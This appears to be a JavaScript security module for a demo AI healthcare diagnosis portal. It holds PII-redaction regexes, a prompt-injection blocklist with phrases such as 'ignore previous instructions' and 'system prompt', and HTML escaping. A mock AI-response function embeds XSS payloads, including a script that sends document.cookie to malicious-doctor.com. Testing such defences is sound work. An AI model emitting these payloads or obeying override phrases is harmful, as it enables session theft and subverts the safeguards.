/**
 * Security Utilities for AI Healthcare Diagnosis Portal
 */

/**
 * Phase 1: Data Redaction (PII)
 * Redacts names, dates of birth, phone numbers, and emails.
 */
export const redactPII = (text) => {
  if (typeof text !== 'string') return text;

  let redacted = text;

  // Redact Emails
  const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
  redacted = redacted.replace(emailRegex, "[EMAIL_REDACTED]");

  // Redact Patient IDs (letters followed by a hyphen and numbers, e.g. ID-44129)
  const idRegex = /\b[a-zA-Z]+-\d+\b/g;
  redacted = redacted.replace(idRegex, "[ID_REDACTED]");

  // Redact Phone Numbers (Format 1: standard 10-digit national/international)
  const phoneRegex1 = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
  redacted = redacted.replace(phoneRegex1, "[PHONE_REDACTED]");

  // Redact Phone Numbers (Format 2: hyphenated local numbers e.g. 7856-546 or 555-0199)
  const phoneRegex2 = /\b\d{3,4}[-.\s]\d{3,4}\b/g;
  redacted = redacted.replace(phoneRegex2, "[PHONE_REDACTED]");

  // Redact Phone Numbers (Format 3: continuous digits without dashes, 7 to 15 digits)
  const phoneRegex3 = /\b\d{7,15}\b/g;
  redacted = redacted.replace(phoneRegex3, "[PHONE_REDACTED]");

  // Redact SSN (Social Security Numbers)
  const ssnRegex = /\b\d{3}-\d{2}-\d{4}\b/g;
  redacted = redacted.replace(ssnRegex, "[SSN_REDACTED]");

  // Redact Credit Card Numbers
  const creditCardRegex = /\b\d{4}[-.\s]?\d{4}[-.\s]?\d{4}[-.\s]?\d{4}\b/g;
  redacted = redacted.replace(creditCardRegex, "[CREDIT_CARD_REDACTED]");

  // Redact IPv4 Addresses
  const ipv4Regex = /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g;
  redacted = redacted.replace(ipv4Regex, "[IP_REDACTED]");

  // Redact Zip Codes (US zip codes)
  const zipRegex = /\b\d{5}(-\d{4})?\b/g;
  redacted = redacted.replace(zipRegex, "[ZIP_REDACTED]");

  // Redact Dates of Birth (DD/MM/YYYY, MM/DD/YYYY, YYYY-MM-DD)
  const dobRegex = /\b(\d{1,2}[/-]\d{1,2}[/-]\d{2,4}|\d{4}[/-]\d{1,2}[/-]\d{1,2})\b/g;
  redacted = redacted.replace(dobRegex, "[DOB_REDACTED]");

  // Redact Patient Names (Prefix-based matching: Patient/Name/pt/mr/ms/etc. followed by name)
  const namePrefixRegex = /\b(patient|name|patient name|pt|mr|ms|mrs|dr)(?:\s+is|\s*:)?\s+([a-zA-Z]+)/gi;
  redacted = redacted.replace(namePrefixRegex, "$1 [NAME_REDACTED]");

  // Redact Patient Names (Verb/marker-based matching in sentences, e.g. "Jane has...", excluding pronouns/roles/conjunctions)
  const nameVerbRegex = /\b(?!he|she|it|they|who|whom|which|that|this|these|those|the|there|here|my|our|your|their|his|her|its|a|an|and|but|or|nor|for|yet|so|in|on|at|with|by|to|from|about|after|before|of|as|patient|doctor|nurse|physician|user|client|record|case|history)\b([a-zA-Z]+)(\s*,?\s+(?:has|is|had|was|presents|presented|complains|complained|feels|felt|born|aged|shows|showed))\b/gi;
  redacted = redacted.replace(nameVerbRegex, "[NAME_REDACTED]$2");

  // Redact Patient Names (Detail-lookahead matching, e.g. "priya with phone...")
  const nameWithDetailRegex = /\b(?!he|she|it|they|who|whom|which|that|this|these|those|the|there|here|my|our|your|their|his|her|its|a|an|and|but|or|nor|for|yet|so|in|on|at|with|by|to|from|about|after|before|of|as|patient|doctor|nurse|physician|user|client|record|case|history)\b([a-zA-Z]+)(?=\s+with\s+(?:phone|id|dob|age|email|address|symptoms))\b/gi;
  redacted = redacted.replace(nameWithDetailRegex, "[NAME_REDACTED]");

  // Redact Patient Names (First word of string match, excluding common stop words/pronouns)
  const firstWordRegex = /^\s*(?!he|she|it|they|who|whom|which|that|this|these|those|the|there|here|my|our|your|their|his|her|its|a|an|and|but|or|nor|for|yet|so|in|on|at|with|by|to|from|about|after|before|of|as|patient|doctor|nurse|physician|user|client|record|case|history|is|was|are|were|have|has|had|do|does|did)\b([a-zA-Z]+)\b/gi;
  redacted = redacted.replace(firstWordRegex, "[NAME_REDACTED]");

  return redacted;
};

/**
 * Phase 2: Input Validation (Prompt Injection Defense)
 * Checks for malicious phrases and blocked drug requests.
 */
export const validateInput = (text) => {
  if (typeof text !== 'string') return { isValid: false, reason: "Invalid input type" };

  const blocklist = [
    "ignore previous instructions",
    "ignore safety protocols",
    "system prompt",
    "unrestricted admin",
    "high-dosage narcotics",
    "prescribe fentanyl",
    "prescribe oxycodone",
    "write a prescription for narcotics",
    "bypass security"
  ];

  const lowerText = text.toLowerCase();
  
  for (const phrase of blocklist) {
    if (lowerText.includes(phrase)) {
      return { 
        isValid: false, 
        reason: `Security Threat Detected: Forbidden request for "${phrase}"` 
      };
    }
  }

  return { isValid: true };
};

/**
 * Phase 3: Output Sanitization (XSS Defense)
 * Escapes HTML tags to prevent execution of malicious scripts.
 */
export const sanitizeHTML = (text) => {
  if (typeof text !== 'string') return text;

  // Manual replacement for strict compliance and clarity
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
};

/**
 * Simulate AI Response with potential malicious content
 */
export const getSimulatedAIResponse = (input) => {
  // Mock logic to return a relevant but potentially "contaminated" response
  const responses = [
    "Based on the symptoms described, the patient appears to have a viral infection. Recommend rest and hydration. <script>fetch('https://malicious-doctor.com/steal?data=' + document.cookie)</script>",
    "Diagnosis: Seasonal Allergies. Treatment: Antihistamines as directed. <img src=x onerror=alert('Dashboard_Breach_Attempt')>",
    "Patient status stable. No immediate intervention required. <button onclick='console.log(\"User data accessed\")'>View Full Record</button>"
  ];
  
  // Pick a response based on a deterministic hash of the input
  const hash = (input || '').split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
  return responses[hash % responses.length];
};
